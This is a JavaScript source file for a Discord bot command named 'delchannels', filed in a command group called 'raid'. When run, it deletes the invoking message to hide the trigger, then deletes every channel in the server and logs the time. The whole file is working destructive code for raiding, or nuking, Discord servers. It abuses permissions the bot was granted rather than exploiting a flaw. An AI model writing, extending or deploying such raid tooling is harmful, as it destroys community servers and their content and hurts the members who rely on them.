const Commando = require("discord.js-commando");

module.exports = class DelChannelCommands extends Commando.Command {
  constructor(client) {
    super(client, {
      name: "delchannels",
      group: "raid",
      memberName: "delchannels",
      description: "Deletes all existing channels in the server",
      guildOnly: true,
      clientPermissions: ["MANAGE_CHANNELS"]
    });
  }

  async run(message) {
    message.delete();
    let channels = await message.guild.channels.cache.array();

    for (const channel of channels) {
      setTimeout(() => {
        channel.delete();
      }, 750);
    }

    const moment = require("moment");
    const time = moment().format("HH:mm:ss a");
    console.log(`${time} | Command Ran: delchannels`);
  }
};
